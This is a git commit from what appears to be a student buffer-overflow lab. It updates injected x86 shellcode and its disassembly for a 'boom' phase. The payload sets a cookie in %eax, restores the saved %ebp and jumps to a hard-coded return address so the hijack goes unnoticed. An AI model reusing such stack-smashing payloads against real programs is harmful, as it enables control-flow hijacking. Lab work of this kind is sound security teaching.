8ee583851d31d37a5cf88f4ba60e64cb058cb7ac
sabertazimi <sabertazimi@gmail.com>
2016-05-05 20:48:30 +0800

    Update(HSI-Lab3): Complete boom phase - restore stack frame

--- hsi/lab3/src/attack.asm
+++ hsi/lab3/src/attack.asm
@@ -9,3 +9,15 @@ Disassembly of section .text:
    7:	ac 98 68 
    a:	68 05 8d 04 08       	push   $0x8048d05
    f:	c3                   	ret    
+
+attack.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 90 ac 98 68       	mov    $0x6898ac90,%eax
+   5:	68 e0 31 68 55       	push   $0x556831e0
+   a:	5d                   	pop    %ebp
+   b:	68 81 8e 04 08       	push   $0x8048e81
+  10:	c3                   	ret    
--- hsi/lab3/src/attack.s
+++ hsi/lab3/src/attack.s
@@ -1,3 +1,5 @@
-movl $0x6898ac90, 0x0804c218
-pushl $0x08048d05
+movl $0x6898ac90, %eax                                          
+pushl $0x556831e0
+popl %ebp
+pushl $0x08048e81
 ret
